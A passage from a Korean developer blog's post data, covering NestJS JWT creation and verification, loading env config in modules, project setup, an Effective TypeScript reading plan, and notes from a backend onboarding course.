VerifyJwtOutboundPort\n  ) {\n    super()\n  }\n\n  async validate(req: Request, payload: any) {\n    const jwt = req.header(\"TestJwtKey\")\n\n    if (!jwt) {\n      throw new AuthException(AuthJwtErrorCode.jwtNotFound())\n    }\n\n    this.verifyjwtOutboundPort.excute({ jwt, tokenType: JWT_TYPE.ACCESS_TOKEN })\n\n    return payload\n  }\n}\n```\n\n덕분에 기존에 있던 JwtStrategy에서 직접 처리를 할 수 있게 되었다.  \n전에 **passport-jwt**사용할 때는 생성자에도 주렁주렁 매달아서 보냈었다.\n\n```typescript\nconstructor() {\n        super({\n            jwtFromRequest: ExtractJwt.fromExtractors([(req: Request) => req.header(\"TestJwtKey\")]),\n            secretOrKey: key,\n            issuer: getJwtIssuer(JWT_TYPE.ACCESS_TOKEN),\n            audience: getJwtAudience(),\n            ignoreExpiration: false,\n            passReqToCallback: true,\n        } as StrategyOptions);\n    }\n```\n\n이제는 **Strategy**영역이 좀 깔끔해 진 것 같다.\n\n그리고 Nest.js에서 제공하는 **JwtService**의 경우 **verify**메서드로 검증을 할 수 있는데,  \n이때는 생성했던 JWT의 속성을 다 가지고 와야 한다.  \n속성은 **issuer** **audience** 등을 의미한다.\n\n쉽게 생성할 때와 맞춰주면 된다.\n\n```typescript\nreturn this.jwtService.sign(\n  { data: payload },\n  {\n    secret: secretKey,\n    expiresIn: expiredTime,\n    audience: getJwtAudience(),\n    issuer: getJwtIssuer(params.jwtType),\n  }\n)\n```\n\n이렇게 생성할 때 **issuer** **audience**를 전달했다면 검증할 때도 같이 넣어줘야 한다.\n\n```typescript\nthis.jwtService.verify(jwt, {\n  secret,\n  audience: getJwtAudience(),\n  issuer: getJwtIssuer(JWT_TYPE.ACCESS_TOKEN),\n} as JwtVerifyOptions)\n```\n\n이런 식으로 처리했다.  \n저 **JwtVerifyOptions** 타입을 타고 들어가면 아래와 같은 것을 확인할 수 있다.\n\n```typescript\nverify<T extends object = any>(token: string, options?: JwtVerifyOptions): T;\n\n\nexport interface JwtVerifyOptions extends jwt.VerifyOptions {\n    secret?: string | Buffer;\n    publicKey?: string | Buffer;\n}\n\nexport interface VerifyOptions {\n    algorithms?: Algorithm[] | undefined;\n    audience?: string | RegExp | Array<string | RegExp> | undefined;\n    clockTimestamp?: number | undefined;\n    clockTolerance?: number | undefined;\n    /** return an object with the decoded `{ payload, header, signature }` instead of only the usual content of the payload. */\n    complete?: boolean | undefined;\n    issuer?: string | string[] | undefined;\n    ignoreExpiration?: boolean | undefined;\n    ignoreNotBefore?: boolean | undefined;\n    jwtid?: string | undefined;\n    /**\n     * If you want to check `nonce` claim, provide a string value here.\n     * It is used on Open ID for the ID Tokens. ([Open ID implementation notes](https://openid.net/specs/openid-connect-core-1_0.html#NonceNotes))\n     */\n    nonce?: string | undefined;\n    subject?: string | undefined;\n    maxAge?: string | number | undefined;\n}\n```\n\n<br>\n\n## 궁금점\n\n기존에 **AuthGuard**부분에서 좀 더 조작하면 할 수 있을 것 같았는데 너무 시간을 빼먹어서 진행하지 않았다.\n\n```typescript\nimport { ExecutionContext, Injectable } from \"@nestjs/common\"\nimport { AuthGuard } from \"@nestjs/passport\"\n\n@Injectable()\nexport class AccessJwtAuthGuard extends AuthGuard(\"accessJwt\") {\n  handleRequest<TUser = any>(\n    err: any,\n    user: any,\n    info: any,\n    context: ExecutionContext,\n    status?: any\n  ): TUser {\n    if (info instanceof JsonWebTokenError) {\n      console.log(\"errror = \")\n      // return { \"data : \": \"test\" } as any;\n      return super.handleRequest(\n        null,\n        { \"data : \": \"test\" },\n        { \"data : \": \"aaaa\" },\n        context,\n        undefined\n      )\n    }\n\n    return super.handleRequest(err, user, info, context, status)\n  }\n}\n```\n\n기존에는 위와 같이 작성했는데 만료하는 시점은 잡을 수 있었지만 컨트롤러에서 바로 에러 응답을 해버렸다.\n\n```typescript\n@Post(\"test\")\n    @UseGuards(AccessJwtAuthGuard)\n    testJwt() {\n        return { ok: \"ok\" };\n    }\n```\n\n정녕 **passport-jwt**에서는 약간의 커스텀 처리를 못하는 것인지...  \n이 부분은 시간이 나면 다시 찾아봐야겠다.\n\n```toc\n\n```\n"},{"excerpt":"블로그용 작은 프로젝트를 만들다가... 이번에 Nest.Js에서 Jwt쓰기 주제로 포스팅을 준비중이다. 근데 처음부터 다시 설치해서 하려니까 몇 가지 막히는 부분이 있었다. 이런 코드가 있다. 근데 @Module 안에서 process.env로 설정파일에 접근하려 했다. 근데 아래와 같이 에러가 발생했다.  이유가 뭘까 잠깐 고민했는데... 기존 프로젝트는…","fields":{"slug":"/nest_js/230213_nestjs_module_config_load/"},"frontmatter":{"date":"February 13, 2023","title":"Nest.Js에서 @Module의 속성에서 process.env 사용하기","description":null,"tags":["NestJs"],"series":"NestJs","previewImage":"nestjs_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nestjs.png)\n\n# 블로그용 작은 프로젝트를 만들다가...\n\n이번에 **Nest.Js**에서 **Jwt**쓰기 주제로 포스팅을 준비중이다.  \n근데 처음부터 다시 설치해서 하려니까 몇 가지 막히는 부분이 있었다.\n\n```typescript\n//auth.module.ts\n@Module({\n    imports: [\n    JwtModule.register({\n      secret: process.env.JWT_KEY,\n      signOptions: { expiresIn: '60s' },\n    }),\n  ],\n})\n```\n\n이런 코드가 있다.  \n근데 @Module 안에서 process.env로 설정파일에 접근하려 했다.\n\n근데 아래와 같이 에러가 발생했다.\n\n![](/img01.png)\n\n이유가 뭘까 잠깐 고민했는데...  \n기존 프로젝트는 이미 다 되어 있는 것이라서 내가 빼 먹은 설정과 패키지가 있었다.\n\n## Next.js에서 Config\n\n이유는 간단했다.  \n먼저 **Config**관련 패키지를 빼먹었었다.\n\n먼저 아래의 명령어로 패키지를 설치해준다.\n\n```\n> yarn add @nestjs/config\n```\n\n그리고 모듈의 최상단인 **app.module**을 연다.  \n아래와 같이 모듈 파일을 수정해준다.\n\n```typescript\nimport { Module } from \"@nestjs/common\"\nimport { ConfigModule } from \"@nestjs/config\"\nimport { AuthModule } from \"./domain/auth/auth.module\"\n\n@Module({\n  imports: [ConfigModule.forRoot(), AuthModule],\n  controllers: [],\n  providers: [],\n})\nexport class AppModule {}\n```\n\n**imports** 부분에서 저렇게 처리하면 된다.\n\n만약 구동 환경마다 설정파일을 좀 다르게 하고 싶다면 아래와 같이 처리가 가능하다.\n\n```typescript\nConfigModule.forRoot({\n    envFilePath: process.env.NODE_ENV === \"prod\" ? \".production.env\" : process.env.NODE_ENV === \"stage-dev\" ? \".stagedev.env\" : \".dev.env\",\n}),\n```\n\nNODE_ENV는 실행 인자에서 전달해주는 것으로 처리했다.  \n이렇게 하면 각 구동 인자에 따라 설정 파일을 다르게 넣을 수 있다.\n\n그리고 아까 예제를 다시 보면...  \n약간 코드를 바꿔야 한다.\n\n```typescript\n//auth.module.ts\n@Module({\n    imports: [\n    JwtModule.registerAsync({\n      useFactory: async () => ({\n        secret: process.env.JWT_KEY,\n        signOptions: { expiresIn: '60s' },\n      }),\n    }),\n  ],\n})\n```\n\n**registerAsync** 이걸 써줘야 정상적으로 값을 불러올 수 있다.  \n저 비동기 등록을 쓰는 이유는 아직 config에서 env를 가져와서 등록하기 위함이다.\n\n만약 일반적으로 **JwtModule.register**를 사용하면 에러가 발생한다.  \n그래서 비동기 등록을 사용해야 한다.\n\n## 정리\n\n아주 간단한 문제였는데 덕분에 하나 배웠다.  \n항상 기존 틀을 이용해서 그대로 진행하니 이런 부분에서 문제가 생기는 것 같다.\n\n틀에서 벗어나 본질을 이해해야 하는데 이 부분이 부족했던 것 같다...\n\n<br>\n\n[참고 Stackoverflow](https://stackoverflow.com/questions/63285055/nestjs-how-to-use-env-variables-in-main-app-module-file-for-database-connecti)  \n[공식 Next.js confing 문서](https://docs.nestjs.com/techniques/configuration)\n\n```toc\n\n```\n"},{"excerpt":"Nest.Js 프로젝트 만들어보기 이번에는 Nest.Js 프로젝트 시작하는 포스팅을 준비했다. 워낙 기초적인 내용이고, 별로 설명할 것도 없으며 공식 홈페이지에 상세히 나와있지만... 내가 또 프로젝트 셋업할 때 잊을까봐 남겨두는 포스팅이다. 진행은 MacOS에서 했다. Nest.Js 설치 크게 두 가지 방법이 있다. 하나는 그냥 npm이나 yarn 등으…","fields":{"slug":"/nest_js/230212_start_nestjs/"},"frontmatter":{"date":"February 12, 2023","title":"Nest.Js 프로젝트 생성하기","description":null,"tags":["NestJs"],"series":"NestJs","previewImage":"nestjs_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nestjs.png)\n\n# Nest.Js 프로젝트 만들어보기\n\n이번에는 Nest.Js 프로젝트 시작하는 포스팅을 준비했다.  \n워낙 기초적인 내용이고, 별로 설명할 것도 없으며 공식 홈페이지에 상세히 나와있지만...  \n내가 또 프로젝트 셋업할 때 잊을까봐 남겨두는 포스팅이다.\n\n진행은 MacOS에서 했다.\n\n## Nest.Js 설치\n\n크게 두 가지 방법이 있다.  \n하나는 그냥 npm이나 yarn 등으로 cli를 받은 다음 설치하는 법과 Github 클론 방식이 있다.\n\n<br>\n\n### Npm (Yarn) 설치\n\nNpm이나 Yarn이 설치되어 있다면 너무 간단하다.  \n프로젝트를 시작할 디렉토리에서 아래의 명령어를 입력해준다.\n\n```\n# 단일 프로젝트 설치 시\n> yarn add @nestjs/cli\n\n# 글로벌 사용 시\n> yarn global add @nestjs/cli\n```\n\n나는 개인적으로 글로벌 설치를 안좋아해서 단일 프로젝트 방식으로 설치했다.  \n이렇게 하면 프로젝트 디렉토리 내에 **node_modules**, **package.json**, **yarn.lock** 파일과 디렉토리가 생긴다.\n\n여기서 아래와 같이 Next.Js를 설치해주면 된다.\n\n```\n# 단일 프로젝트 설치 시\n> yarn nest new [프로젝트 이름]\n> yarn nest new NextJsExam\n\n# 글로벌 설치 방법 시\n> nest new NestJsExam\n```\n\n만약 자신이 특정 디렉토리에서 Nest.Js를 시작하길 원한다면 프로젝트 이름에 특정 디렉토리를 적어주면 된다.\n\n```\n> yarn nest new ./Exam/UserExam01\n```\n\n**new** 명령어를 통해 프로젝트를 생성하면 아래와 같이 진행된다.\n\n![](/img01.png)\n\n<br>\n\n설치되기 앞서 먼저 npm 또는 yarn 그리고 pnpm 중 어느 패키지 메니저를 사용할지 물어본다.  \n자신이 원하는 것을 정하면 각종 Nest.Js를 구동하기 위한 파일들이 설치된다.\n\n![](/img02.png)\n\n설치가 다 되면 테스트를 해본다.\n\n![](/img03.png)\n\n<br>\n\n이렇게 서버가 올라간 것을 확인할 수 있고, 브라우저에서 접근하면 아래와 같이 확인할 수 있다.\n\n![](/img04.png)\n\n<br>\n\n만약 Stric모드 활성화를 하려면 **--strict**옵션을 주면된다.\n\n```\n> yarn nest new NextJsExam --strict\n```\n\n<br>\n\n### Github clone 설치\n\ngit 명령어 중 clone을 통해서 생성하는 법이 있다.  \n아래의 명령어를 참고하자.\n\n```\n$ git clone https://github.com/nestjs/typescript-starter.git project\n$ cd project\n$ npm install\n$ npm run start\n```\n\n저기서 **project**는 자신의 디렉토리를 지정해주면 된다.\n\n<br>\n\n## 정리\n\nNest.Js의 경우 Typescript를 기본으로 사용한다.  \n더 자세한 설명이 필요한 경우 [공식 페이지](https://docs.nestjs.com)를 참고하자.\n\n```toc\n\n```\n"},{"excerpt":"JWT를 원래 쓰고 있었지만... 전에도 썼었고, 지금도 쓰고 있는 JWT JWT에 대한 개념적인 것은 넘어가고, Nest.js에서 JWT를 쓰는 방법에 대해서 포스팅 해보려 한다. 사실 JWT를 그냥 쓰면 안되고, 몇 가지 기본적인 정책이나 알아야 할 점이 있지만, 이번 포스팅에서는 Nest.js에서 JWT를 생성하는 것에 포커스를 두려 한다. JWT에…","fields":{"slug":"/nest_js/230208_nesjs_jwt_part1/"},"frontmatter":{"date":"February 08, 2023","title":"Nest.Js에서 JWT 사용하기 (Part01 JWT 생성해보기)","description":null,"tags":["NestJs","JWT"],"series":"NestJs","previewImage":"nestjs_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nestjs.png)\n\n# JWT를 원래 쓰고 있었지만...\n\n전에도 썼었고, 지금도 쓰고 있는 JWT  \nJWT에 대한 개념적인 것은 넘어가고, Nest.js에서 JWT를 쓰는 방법에 대해서 포스팅 해보려 한다.\n\n사실 JWT를 그냥 쓰면 안되고, 몇 가지 기본적인 정책이나 알아야 할 점이 있지만,  \n이번 포스팅에서는 Nest.js에서 **JWT를 생성**하는 것에 포커스를 두려 한다.\n\nJWT에 대해서는 아주 예전에 포스팅을 했었다.  \nJWT의 이론적인 부분이 궁금한 분은 [JWT 포스팅](https://elfinlas.github.io/basic_know/180812_what_is_jwt/)을 참고해주시길...\n\n이와 관련한 코드는 [Github](https://github.com/elfinlas/NestJsJwt)에 등록하였다.  \n일단 메인 브런치인데 향후 Part별로 브런치를 나누거나, 커밋으로 할 예정이다.  \n이와 관련한 것은 향후 다시 업데이트 예정이다.\n\n## Nest.js에서 JWT 사용하기\n\n본격적으로 설명에 앞서 위에 언급한 것처럼...  \n이번 포스팅에서는 Nest.js에서 JWT를 생성하는 것에 포커스를 둔 코드다.  \n그래서 약간 코드가 엉성할 수 있다.\n\n하지만 어떻게 사용해서 적용하는지를 볼 수 있는 예제성 코드다.  \n이 부분은 감안해서 봐주시길 바란다.\n\n구성은 controller에서 Url 호출하면 JWT 생성 서비스를 호출해서 반환하는 형태로 되어 있다.  \n[Github](https://github.com/elfinlas/NestJsJwt)에서 클론을 받아서 사용해도 되고,  \n각 코드를 보면서 참고해도 된다.\n\n### 패키지 설치\n\n먼저 아래와 같은 패키지를 설치해준다.\n\n```\n> yarn add @nestjs/jwt\n```\n\n이 패키지는 Nest.js에서 제공하는 패키지이며, JWT 조작을 하는데 도음을 주는 유틸리티 패키지다.  \n사실 JWT 전략이나 좀 더 편리하게 쓰기 위해서는 **passport-jwt**를 설치해야 하는데 이는 **Part2**에서 다룰 예정이다.\n\n일단 예제를 돕기 위해 **auth**라는 도메인으로 빼고 모듈로 나눴다.\n\n![](/img01.png)\n\n<br>\n\n### JwtModule 등록\n\n일단 **module**에 아래와 같이 **JwtModule**을 추가해준다.\n\n```typescript\n//auth.module.ts\nimport { Module } from \"@nestjs/common\"\nimport { JwtModule } from \"@nestjs/jwt\"\nimport { CreateJwtController } from \"./controllers/create.jwt.controller\"\nimport { CREATE_JWT_OUTBOUND_PORT } from \"./port/out/create.jwt.outbound.port\"\nimport { CreateJwtService } from \"./services/jwt/create.jwt.service\"\n\n@Module({\n  imports: [\n    JwtModule.registerAsync({\n      useFactory: async () => ({\n        secret: process.env.JWT_KEY,\n        signOptions: { expiresIn: \"60s\" },\n      }),\n    }),\n  ],\n  controllers: [CreateJwtController],\n  providers: [\n    { provide: CREATE_JWT_OUTBOUND_PORT, useClass: CreateJwtService },\n  ],\n})\nexport class AuthModule {}\n```\n\n저기서 **imports** 부분에서 **secret**은 Jwt 서명키를 넣는 부분이다.  \n나는 설정 파일을 빼서 처리했다.\n\n왜 저렇게 했는지 궁금한 분은 아래 포스팅을 참고하자.  \n[Nest.Js에서 @Module의 속성에서 process.env 사용하기](https://elfinlas.github.io/nest_js/230213_nestjs_module_config_load/)\n\n**JwtModule** 모듈을 통해 Jwt를 생성하고, 검증하는 기능을 쉽게 사용할 수 있다.  \n일단 모듈을 등록했다면 Jwt를 생성해보도록 하자.\n\n<br>\n\n### Jwt 생성 서비스\n\n생성 서비스 로직은 아주 간단하다.  \n왜냐하면...그냥 생성만 하는 샘플이기 때문이다. -\\_-;;\n\n여기에서 비즈니스 요구사항이 붙기 시작하면 그때부터는 약간씩 무거워진다.  \n무튼 이번 포스팅은 Jwt 생성에 포커스가 되어 있기에 다른 요건은 무시하고 생성에만 집중한다.\n\n```typescript\n//create.jwt.service.ts\nimport { Inject } from \"@nestjs/common\"\nimport { JwtService } from \"@nestjs/jwt\"\nimport {\n  CreateJwtOutboundPort,\n  CreateJwtInputDto,\n  CreateJwtOutputDto,\n} from \"../../port/out/create.jwt.outbound.port\"\n\nexport class CreateJwtService implements CreateJwtOutboundPort {\n  constructor(@Inject(JwtService) private jwtService: JwtService) {}\n\n  excute(params: CreateJwtInputDto): CreateJwtOutputDto {\n    const payload = { user: \"bcow\" }\n    return { jwt: this.jwtService.sign(payload) }\n  }\n}\n```\n\n여기서 보면 정말 아주 간단하게 Jwt를 생성할 수 있음을 확인할 수 있다.  \n아마 **Part02**로 가면 점점 코드가 늘어나게 될 것이다.\n\n<br>\n\n### Jwt 생성 확인용 컨트롤러\n\n이제는 생성된 jwt를 확인해봐야 하는데 간단하게 컨트롤러를 하나 만들자.\n\n```typescript\n//create.jwt.controller.ts\nimport { Controller, Get, Inject } from \"@nestjs/common\"\nimport { CREATE_JWT_OUTBOUND_PORT } from \"../port/out/create.jwt.outbound.port\"\nimport { CreateJwtService } from \"../services/jwt/create.jwt.service\"\n\n@Controller(\"auth\")\nexport class CreateJwtController {\n  constructor(\n    @Inject(CREATE_JWT_OUTBOUND_PORT)\n    private readonly createJwtService: CreateJwtService\n  ) {}\n\n  @Get(\"jwt\")\n  makeJwt() {\n    return this.createJwtService.excute({})\n  }\n}\n```\n\n<br>\n\n코드가 뭔가 성의없어 보일 수 있지만...  \n예제 코드다.\n\n나도 다테일하게 짜고 싶지만...  \n시간 부족으로 인해...  \n자세하게 짜는 것은 **Part02** 포스팅에서 다시 다뤄보겠다.\n\n무튼 이렇게 작성하고 구동해보면...\n\n<br>\n\n![](/img02.png)\n\n<br>\n\n잘 생성되는 것을 확인할 수 있다.  \n[Jwt.io](https://jwt.io)에서도 확인이 가능하다.  \n만든 jwt를 넣어보면 아래와 같이 유효한 Jwt가 생성되었음을 확인할 수 있다.\n\n<br>\n\n![](/img03.png)\n\n## 정리\n\n이번 Part01에서는 Jwt 생성까지만 다뤄봤다.  \n다음 포스팅에서는 이제 Passport-Jwt 활용 및 어떤 식으로 사용하는지에 대해 포스팅해볼 예정이다.\n\n사실 이번주에 끝내려 했는데 현재 일정이 너무 타이트 해서 일단 맛보기 용으로 먼저 포스팅했다.  \n시간이 될 때 얼른 마저 끝내봐야겠다.\n\n참고 사이트는 아래와 같다.\n\n[공식 문서](https://docs.nestjs.com/security/authentication#jwt-functionality)\n\n<br>\n\n### PS\n\n원래 레이어드 아키텍쳐를 쓰려 했지만...  \n[백엔드 프리온보딩](https://elfinlas.github.io/til/230114_wanted_preon_back02/)에서 배운 **Ports and Adapter 아키텍쳐**로 한번 짜봐야겠다 싶어서 써봤다.\n\n현재 개발중인 코드에서도 적용 중이긴 한데...\n약간 코드가 미흡할 수 있다.\n\n코드는 [Github](https://github.com/elfinlas/NestJsJwt)를 참고하시면 된다.\n\n이 부분은 혹시 고수가 있다면 댓글로 알려주시면 감사하겠다.\n\n```toc\n\n```\n"},{"excerpt":"타입스크립트를 접하게 되면서... 자바에서도 유명한 책이다. 물론 이름은 다르지만 앞에 이펙티브가 붙는 것은 같다. 이 책은 나같은 초급자들이 언어에 대한 이해도를 높이고, 좀 더 나은 코드를 작성하기 위해서 읽어야 하는 필독서로 알려져있다. 그래서 차근차근 공부를 하며 여기에 있는 지식을 내것으로 만들어보려 한다. 시간이 항상 부족하지만... 나 자신의…","fields":{"slug":"/book/230208_effective_typescript/"},"frontmatter":{"date":"February 08, 2023","title":"(Book) 이펙티브 타입스크립트 동작 원리의 이해와 구체적인 조언 62가지 (Effective Typescript)","description":null,"tags":["Typescript","Effective Typescript"],"series":"Book","previewImage":"oop.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](/book_effective_typescript_thumbnail.png)\n\n# 타입스크립트를 접하게 되면서...\n\n자바에서도 유명한 책이다.  \n물론 이름은 다르지만 앞에 이펙티브가 붙는 것은 같다.\n\n이 책은 나같은 초급자들이 언어에 대한 이해도를 높이고,  \n좀 더 나은 코드를 작성하기 위해서 읽어야 하는 필독서로 알려져있다.\n\n그래서 차근차근 공부를 하며 여기에 있는 지식을 내것으로 만들어보려 한다.  \n시간이 항상 부족하지만...  \n나 자신의 실력을 올리는 시간은 잠을 줄여서라도 내야 한다.\n\n이번 포스팅은 내가 이 책을 읽으면서 배운 내용을 정리하는 포스팅이다.  \n책을 안 읽은 사람도 이해하기 편하게 포스팅을 해보려 한다.\n\n주요 내용 및 개념 그리고 코드로 설명을 할 예정이며, 핵심적인 부분만 다룬다.\n\n이 포스팅이 책을 완전히 대신할 수는 없겠지만,  \n책을 요약하는 정도로 다 읽지 않아도 그 책에서 전하려 하는 내용을 모두 담을 예정이다.  \n아래는 책의 전체 목차다.\n\n<br>\n\n## 목차\n\n### 1장 타입스크립트 알아보기\n\n- 아이템 1 타입스크립트와 자바스크립트의 관계 이해하기\n- 아이템 2 타입스크립트 설정 이해하기\n- 아이템 3 코드 생성과 타입이 관계없음을 이해하기\n- 아이템 4 구조적 타이핑에 익숙해지기\n- 아이템 5 any 타입 지양하기\n\n<br>\n\n### 2장 타입스크립트의 타입 시스템\n\n- 아이템 6 편집기를 사용하여 타입 시스템 탐색하기\n- 아이템 7 타입이 값들의 집합이라고 생각하기\n- 아이템 8 타입 공간과 값 공간의 심벌 구분하기\n- 아이템 9타입 단언보다는 타입 선언을 사용하기\n- 아이템 10 객체 래퍼 타입 피하기\n- 아이템 11 잉여 속성 체크의 한계 인지하기\n- 아이템 12 함수 표현식에 타입 적용하기\n- 아이템 13 타입과 인터페이스의 차이점 알기\n- 아이템 14 타입 연산과 제너릭 사용으로 반복 줄이기\n- 아이템 15 동적 데이터에 인덱스 시그니처 사용하기\n- 아이템 16 number 인덱스 시그니처보다는 Array, 듀플, ArrayLike를 사용하기\n- 아이템 17 변경 관련된 오류 방지를 위해 readonly 사용하기\n- 아이템 18 매핑된 타입을 사용하여 값을 동기화하기\n\n<br>\n\n### 3장 타입 추론\n\n- 아이템 19 추론 가능한 타입을 사용해 장황한 코드 방지하기\n- 아이템 20 다른 타입에는 다른 변수 사용하기\n- 아이템 21 타입 넓히기\n- 아이템 22 타입 좁히기\n- 아이템 23 한꺼번에 객체 생성하기\n- 아이템 24 일관성 있는 별칭 사용하기\n- 아이템 25 비동기 코드에는 콜백 대신 asyne 함수 사용하기\n- 아이템 26 타입 추론에 문맥이 어떻게 사용되는지 이해하기\n- 아이템 27 함수형 기법과 라이브러리로 타입 흐름 유지하기\n\n<br>\n\n### 4장 타입 설계\n\n- 아이템 28 유효한 상태만 표현하는 타입을 지향하기\n- 아이템 29 사용할 때는 너그럽게, 생성할 때는 엄격하게\n- 아이템 30 문서에 타입 정보를 쓰지 않기\n- 아이템 31 타입 주변에 null값 배치하기\n- 아이템 32 유니온의 인터페이스보다는 인터페이스의 유니온을 사용하기\n- 아이템 33 string 타입보다 더 구체적인 타입 사용하기\n- 아이템 34 부정확한 타입보다는 미완성 타입을 사용하기\n- 아이템 35 데이터가 아닌, API와 명세를 보고 타입 만들기\n- 아이템 36 해당 분야의 용어로 타입 이름 짓기\n- 아이템 37 공식 명칭에는 상표를 붙이기\n\n<br>\n\n### 5장 any 다루기\n\n- 아이템 38 any 타입은 가능한 한 좁은 범위에서만 사용하기\n- 아이템 39 any를 구체적으로 변형해서 사용하기\n- 아이템 40 함수 안으로 타입 단언문 감추기\n- 아이템 41 any의 진화를 이해하기\n- 아이템 42 모르는 타입의 값에는 any 대신 unknown을 사용하기\n- 아이템 43 몽키 패치보다는 안전한 타입을 사용하기\n- 아이템 44 타입 커버리지를 추적하여 타입 안전성 유지하기\n\n<br>\n\n### 6장 타입 선언과 @types\n\n- 아이템 45 denDenendencies에 spescrip와 eypes 추가하기\n- 아이템 46 타입 선언과 관련된 세 가지 버전 이해하기\n- 아이템 47 공개 API에 등장하는 모든 타입을 익스포트하기\n- 아이템 48 APT 주석에 TSDoc 사용하기\n- 아이템 49 콜백에서 this에 대한 타입 제공하기\n- 아이템 50 오버로딩 타입보다는 조건부 타입을 사용하기\n- 아이템 51 의존성 분리를 위해 미러 타입을 사용하기\n- 아이템 52 테스팅 타입의 함정에 주의하기\n\n<br>\n\n### 7장 코드를 작성하고 실행하기\n\n- 아이템 53 타입스크립트 기능보다는 ECMAScript 기능을 사용하기\n- 아이템 54 객체를 순회하는 노하우\n- 아이템 55 DOM 계층 구조 이해하기\n- 아이템 56 정보를 감추는 목적으로 private 사용하지 않기\n- 아이템 57 소스맵을 사용하여 타입스크립트 디버깅하기\n\n<br>\n\n### 8장 타입스크립트로 마이그레이션하기\n\n- 아이템 58 모던 자바스크립트로 작성하기\n- 아이템 59 타입스크립트 도입 전에 @ts-check와 JSDoc으로 시험해 보기\n- 아이템 60 allows로 타입스크립트와 자바스크립트 같이 사용하기\n- 아이템 61 의존성 관계에 따라 모듈 단위로 전환하기 ..\n- 아이템 62 마이그레이션의 완성을 위해 nolmplicitAny 설정하기\n\n<br>\n\n각 장마다 하나의 포스팅으로 이뤄질 예정이다.  \n포스팅이 완료되면 이 문서에도 링크를 달아서 완성할 예정이다.\n\n<br>\n\n## PS:\n\n개발자라는 것은 공부할게 참 많은 것 같다.  \n자본주의 세상에서 잘 살아남으려면 개발 외에도 경제, 인문, 금융, 투자, 부동산 같은 지식도 배워야 하는데,  \n어찌보면 개발자가 이럴 때는 많이 불리하지 않나 싶다.\n\n뭐 어느 직업군이던 배울게 많고 하지만,  \n개발자라는 건 하루가 지날때 마다 다양한 것들이 쏟아져나와서 무한 학습을 해야 한다.\n\n근데 또 이것만 하면 진짜 내 앞날 조금만 보며 살 수 밖에 없다.  \n개발이 평생 직업으로 삼을 수 없듯이...(견해 차이는 있겠지만 다들 공감할 듯...)\n\n월급 500 이하로는 서울에 있는 투자용 부동산은 꿈도 못꾼다.\n\n개발자 연봉이 5천, 8천 이런다고 하지만,  \n4대보험 나가고 뭐 하고 하면 실제 통장에 꼽히는 돈은 약 3~500 정도일 것이다.\n\n물론 대기업 좋은데 가면 성과급(PS) 나온다고 하지만,  \n이거 해봤자 1500 ~ 2000? 많이 나오면 3천 정도?\n\n안나오는것 보다 좋겠지만 서울에 괜찮은,  \n또는 경기도에서 괜찮은 곳에서 살기엔 부족한 자금이다.  \n(역시 여기도 상대적 개념이니까...)\n\n뭐 취미나 1인 창업자면 제외겠지만 ㅎㅎ\n\n투자용으로 서울에 집 한채 사고, 내가 살 집하나 두고 하려면 못해도 최소 15억 이상이 필요한데  \n이걸 개발자라는 직업으로 할 수 있을까 싶다. (금수저 은수저 제외, 맨땅 해딩부터 기준)\n\n그나마 개발자라는 것은 항상 수요가 있으니까 다행인 직업군이지만...\n\n이제 3월 말부턴 나도 서울쪽 임장을 다니면서 부동산 매물을 좀 볼까 하는데...  \n뭔가 부동산 쪽으로 아이디어가 생각났다.\n\n하지만 이미 진행하고 있는...  \n그리고 해야 하는 흑집사부터... -\\_-;;  \n일단 다 매듭짓고 다시 생각해봐야겠다.\n\n개발자로 돈을 많이 벌 수 있을까?  \n이건 참 재미있는 주제인 것 같다.\n\n그냥 블로그 포스팅하나가 생각이 들었다 ㅎㅎ\n\n```toc\n\n```\n"},{"excerpt":"오늘의 강의는.. 2일차 부터는 실제 Nest.Js에 대해서 알아보고, **포트 앤 어뎁터 아키텍쳐(Ports and Adapters Architecture)**에 대해 설명을 하는 시간을 가졌다. 강의를 들으면서 내용을 정리한 부분이다. 옆에서 강의 틀고 노션 및 수기로(개판 필기체를 해석 하는데 힘들었다...) 작성한 것을 다시 곱씹고 하면서 강의 내…","fields":{"slug":"/til/230114_wanted_preon_back02/"},"frontmatter":{"date":"February 07, 2023","title":"23년 1월 원티드 프리온보딩 백엔드 2일차 TIL (실무 함수형 프로그래밍 빌드업) (Wanted Pre Onboarding BackEnd)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](/img01.png)\n\n# 오늘의 강의는..\n\n2일차 부터는 실제 Nest.Js에 대해서 알아보고, **포트 앤 어뎁터 아키텍쳐(Ports and Adapters Architecture)**에 대해 설명을 하는 시간을 가졌다.  \n강의를 들으면서 내용을 정리한 부분이다.\n\n옆에서 강의 틀고 노션 및 수기로(개판 필기체를 해석 하는데 힘들었다...) 작성한 것을 다시 곱씹고 하면서 강의 내용을 정리했다.  \n이렇게 라이브를 직접 옮기면서 작성한 것을 정리한 것이라 약간 엉성할 수 있다.  \n이 부분은 감안하고 봐주시길 바란다.\n\n<br>\n\n## 강사님의 이야기 시간\n\n강사님의 개발자 일대기 이야기를 해주셨다.  \n재직한 회사에서 다양한 경험을 쌓으셨고 매 순간 열심히 하신 것 같다.\n\n어떤이는 운도 중요하여, 열심히 해도 운이 안좋으면 취업, 이직이 어렵다 라고 이야기 하는 사람도 있다.  \n하지만 개인적으로 거꾸로 아닌가 싶다.\n\n**열심히 노력하고 준비를 하고 있어여 기회가 온 운을 잡을 수 있는게 아닌가?** 라는게 나의 생각이다.\n\n<font color=\"red\"> 불확실성은 곧 희망이다.</font>\n\n강사님의 이 멘트가 개인적으로 많이 와닿았다.\n\n<br>\n\n## 실무 함수형 프로그래밍 빌드업\n\n오늘의 강의 내용은 아래와 같았다.\n\n1. Nest.Js 주요 컨셉\n2. Ports and Adapters Architecture\n3. Live Coding1 : Nest.js 로 프로젝트 아키텍처 구성하기\n4. Live Coding2 : 사전과제 로직 함께 리팩토링 하기\n\n초반에 많은 질의가 있었다.  \n간단하게 정리하면...\n\n- Express를 안쓰는 것은 아니다.\n- Express를 좀 더 추상화 한 개념이 Nest.js\n- Nest.Js는 Express 기반이고, Angular에서 많은 영감을 받아서 개발하였다.\n- **Layerd Architecture**는 기업에서 많이 채택하는 아키택쳐\n- 쉽게 프로젝트를 구성할 수 있는 아키텍쳐\n- Ports and Adapters Architecture 는 여기서 한 단계 더 진화된 